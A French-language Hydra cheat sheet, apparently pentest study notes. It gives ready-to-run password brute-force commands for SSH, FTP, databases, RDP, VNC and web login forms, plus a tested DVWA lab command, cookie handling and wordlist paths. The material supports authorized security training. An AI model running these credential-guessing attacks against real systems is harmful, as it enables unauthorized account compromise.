# hydra — cheat sheet

> Outil de brute force généraliste — supporte une cinquantaine de protocoles.
> À utiliser uniquement sur des systèmes dont tu as l'autorisation.

---

## syntaxe de base

```bash
hydra -l <user> -P <wordlist> <protocole>://<IP>
hydra -L <users_list> -P <wordlist> <protocole>://<IP>
hydra -l <user> -p <password> <protocole>://<IP>     # tester un seul credential
```

---

## flags essentiels

| flag | nom | effet |
|------|-----|-------|
| `-l <user>` | login | username unique |
| `-L <fichier>` | login list | liste de usernames |
| `-p <pass>` | password | password unique |
| `-P <fichier>` | password list | wordlist de passwords |
| `-s <port>` | service port | port non standard |
| `-t <n>` | tasks | nombre de threads parallèles (défaut: 16) |
| `-v` | verbose | affiche chaque tentative |
| `-V` | very verbose | affiche login+pass à chaque essai |
| `-f` | found | stop dès le premier succès |
| `-F` | found all | stop dès le premier succès par host |
| `-o <fichier>` | output | sauvegarder les résultats |
| `-e nsr` | extra | tester: n=blank, s=login=pass, r=reverse login |
| `-w <n>` | wait | timeout en secondes |
| `-R` | restore | reprendre une session interrompue |

---

## protocoles courants

```bash
ssh://IP
ftp://IP
telnet://IP
http-get://IP
http-post-form://IP
smb://IP
rdp://IP
mysql://IP
postgres://IP
vnc://IP
smtp://IP
imap://IP
pop3://IP
```

---

## exemples par protocole

### SSH
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P rockyou.txt ssh://192.168.1.10 -t 4
```

### FTP
```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.10
hydra -l anonymous -p anonymous ftp://192.168.1.10    # tester l'accès anonyme
```

### MySQL
```bash
hydra -l root -P rockyou.txt mysql://192.168.1.10
hydra -l root -p "" mysql://192.168.1.10              # tester sans mot de passe
```

### PostgreSQL
```bash
hydra -l postgres -P rockyou.txt postgres://192.168.1.10 -s 5432
hydra -l postgres -p postgres postgres://192.168.1.10 -s 5432
```

### SMB — utiliser crackmapexec à la place
```bash
# hydra SMB ne supporte pas SMBv2 — préférer crackmapexec
crackmapexec smb 192.168.1.10 -u user -P rockyou.txt
```

### HTTP formulaire login
```bash
hydra -l admin -P rockyou.txt http-post-form://192.168.1.10"/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### VNC
```bash
hydra -P rockyou.txt vnc://192.168.1.10    # VNC n'a pas de username
```

### Telnet
```bash
hydra -l root -P rockyou.txt telnet://192.168.1.10
```

### RDP (Windows)
```bash
hydra -l administrator -P rockyou.txt rdp://192.168.1.10 -t 4
```

---

## port non standard

```bash
hydra -l postgres -P rockyou.txt postgres://192.168.1.10 -s 5433
hydra -l admin -P rockyou.txt ssh://192.168.1.10 -s 2222
```

---

## options utiles

### tester login = password (très courant)
```bash
hydra -l admin -e s ssh://192.168.1.10       # s = same, teste admin:admin
hydra -L users.txt -e nsr ssh://192.168.1.10  # n=blank, s=same, r=reverse
```

### limiter les threads (éviter de bloquer le service)
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10 -t 4    # 4 threads
hydra -l root -P rockyou.txt smb://192.168.1.10 -t 1    # SMB = 1 thread obligatoire
```

### sauvegarder et reprendre
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10 -o results.txt
hydra -R    # reprendre la dernière session interrompue
```

---

## lire les résultats

```
[22][ssh] host: 192.168.1.10   login: root   password: toor
```

`[port][protocole] host: IP login: user password: mdp`

---

## hydra vs crackmapexec

| | hydra | crackmapexec |
|--|-------|-------------|
| protocoles | ~50 protocoles | SMB, LDAP, SSH, RDP, MSSQL, WINRM |
| SMBv2 | non supporté | oui |
| facilité | simple | simple |
| usage | tout sauf SMB moderne | environnements Windows/AD |

**Règle :** port SMB 445 → crackmapexec. Tout le reste → hydra.

---

## wordlists utiles sur Kali

```
/usr/share/wordlists/rockyou.txt          # 14M mots de passe — référence
/usr/share/wordlists/fasttrack.txt        # mots de passe courants — rapide
/usr/share/seclists/Passwords/            # collections variées
/usr/share/seclists/Usernames/            # listes de usernames
```

# Hydra — brute force HTTP

> Hydra attaque des formulaires web en testant des milliers de combinaisons login/password.
> Deux modules principaux : `http-get-form` et `http-post-form`.

---

## Structure de base

```
hydra -l USER -P wordlist CIBLE MODULE 'PATH:PARAMS:F=MESSAGE_ECHEC'
```

Les trois parties séparées par `:` dans la chaîne :
```
'PATH : PARAMS : F=MESSAGE_ECHEC'
```

**Toujours utiliser des guillemets simples `'`** autour de toute la chaîne.

---

## Identifier GET ou POST

Regarde l'URL après avoir soumis le formulaire :

**GET** — les données sont dans l'URL :
```
http://site.com/login?username=admin&password=1234
→ utilise http-get-form
```

**POST** — l'URL ne change pas, les données sont cachées :
```
http://site.com/login  (URL identique)
→ utilise http-post-form
```

---

## http-get-form — sans cookie

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.159.142 http-get-form \
  '/login.php:username=^USER^&password=^PASS^&Login=Login:F=Invalid credentials' \
  -t 4 -f
```

---

## http-get-form — avec cookie (page protégée)

**RÈGLE CRITIQUE** : le `:` dans `Cookie:` doit être échappé avec `\:`
sinon Hydra l'interprète comme un séparateur de section.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.159.142 http-get-form \
  '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=abc123; security=low:F=Username and/or password incorrect' \
  -t 4 -f
```

Points clés :
- Guillemets **simples** `'` autour de toute la chaîne
- `H=Cookie\:` — le `:` échappé avec `\`
- `F=` avant le message d'échec — pas de point `.` à la fin
- `security=low` après le PHPSESSID séparé par `;`

---

## Récupérer le cookie

**Dans Firefox :**
```
F12 → Storage → Cookies → copier PHPSESSID et security
```

**Avec curl :**
```bash
curl -s "http://IP/dvwa/vulnerabilities/brute/?username=admin&password=FAUX&Login=Login" \
  -b "PHPSESSID=abc123; security=low" | grep -i "incorrect\|welcome\|error"
```

---

## Le message d'échec — crucial

- Toujours **copier-coller** depuis la page — jamais taper à la main
- Utilise `F=` devant le message
- Pas de point `.` à la fin

```
F=Username and/or password incorrect
```

---

## Options utiles

```bash
-l admin          # username fixe
-L users.txt      # liste de usernames
-p password       # password fixe
-P rockyou.txt    # liste de passwords
-t 4              # threads parallèles
-f                # stop au premier résultat
-o found.txt      # sauvegarde les résultats
-v                # verbose
```

---

## Commande complète DVWA — testée et fonctionnelle

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.159.142 http-get-form \
  '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=TON_PHPSESSID; security=low:F=Username and/or password incorrect' \
  -t 4 -f
```

Remplace `TON_PHPSESSID` par la valeur dans Firefox F12 → Storage → Cookies.

---

## Résultat attendu

```
[80][http-get-form] host: 192.168.159.142   login: admin   password: password
[STATUS] attack finished for 192.168.159.142 (valid pair found)
```